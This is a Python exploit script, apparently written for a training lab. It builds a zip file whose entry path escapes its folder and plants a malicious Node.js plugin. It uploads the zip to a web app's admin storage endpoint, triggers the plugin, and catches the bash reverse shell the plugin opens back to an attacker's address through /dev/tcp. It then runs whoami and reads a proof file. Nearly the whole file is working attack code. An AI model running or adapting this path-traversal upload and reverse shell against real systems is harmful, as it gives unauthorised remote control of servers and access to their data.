SHELL_FILE_NAME = f"shell_{datetime.datetime.now().timestamp()}".replace(".", "")


def generate_zip_buffer(args):
    evil_js = (
        """
        exports.execute = async () => {
            //CREATED - NOW - 
            const { exec } = require('child_process');
            exec('bash -c "bash -i >& /dev/tcp/LADDR/LPORT 0>&1 &"');
            return { status: "all good" };
        };
    """.replace("LADDR", args.laddr)
        .replace("LPORT", f"{args.lport}")
        .replace("NOW", f"{SHELL_FILE_NAME}")
    )

    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(f"../plugins/{SHELL_FILE_NAME}.js", evil_js)
    print("[+] created zip buffer")
    return zip_buffer


def send_zip_buffer(args, session, zip_buffer):
    url = f"{args.target}/admin/storage"
    zip_buffer.seek(0)
    files = {"zipFile": ("evil_js.zip", zip_buffer, "application/zip")}
    print("[*] Getting ready to send evil_js.zip")
    resp = session.post(url, files=files)
    print(f"[+] {resp.text}")


def get_proof_text(args, session):
    trigger_url = f"{args.target}/admin/plugin?plugin={SHELL_FILE_NAME}.js"
    with MySocket(lport=args.lport) as shell:
        threading.Thread(
            target=lambda: session.get(url=trigger_url),
            daemon=True,
        ).start()
        print(f"[+] Recieve whoami: {shell.get("whoami")}")
        print(f"[+] Recieve whoami: {shell.get("whoami")}")
        print(f"[*] Find the proof file content")
        proof_text = shell.get("cat /home/student/notebook/proof.txt")
        print(f"[+] Found proof.txt {proof_text}")
    return proof_text
